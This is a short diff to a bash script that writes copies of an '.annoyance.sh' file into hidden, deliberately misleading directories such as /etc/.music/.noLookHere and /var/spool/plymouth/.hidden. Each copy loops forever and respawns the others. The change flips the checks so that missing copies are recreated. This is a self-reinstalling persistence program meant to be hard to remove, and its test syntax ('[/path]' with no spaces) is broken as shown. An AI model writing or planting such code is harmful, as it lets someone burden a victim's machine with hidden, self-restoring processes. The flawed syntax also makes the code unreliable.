@@ -5,9 +5,8 @@ cat <<EOFA > /etc/.music/.noLookHere/.annoyance.sh
 #!/bin/bash
 while true
 do
-if [/var/spool/plymouth/.hidden/.annoyance.sh]
+if ! [/var/spool/plymouth/.hidden/.annoyance.sh]
 then
-else
 if [/var/spool/plymouth/.hidden]
 then
 cat <<EOFB > /var/spool/plymouth/.hidden/.annoyance.sh
@@ -39,9 +38,8 @@ cat <<EOFD > /var/spool/plymouth/.hidden/.annoyance.sh
 #!/bin/bash
 while true
 do
-if [/var/spool/.annoyance.sh]
+if ! [/var/spool/.annoyance.sh]
 then
-else
 cat <<EOFE > /var/spool/.annoyance.sh
 #!/bin/bash
 while true
@@ -65,9 +63,8 @@ cat <<EOFF > /var/spool/plymouth/.hidden/.annoyance.sh
 #!/bin/bash
 while true
 do
-if [/var/spool/.annoyance.sh]
+if ! [/var/spool/.annoyance.sh]
 then
-else
 cat <<EOFG > /var/spool/.annoyance.sh
 #!/bin/bash
 while true
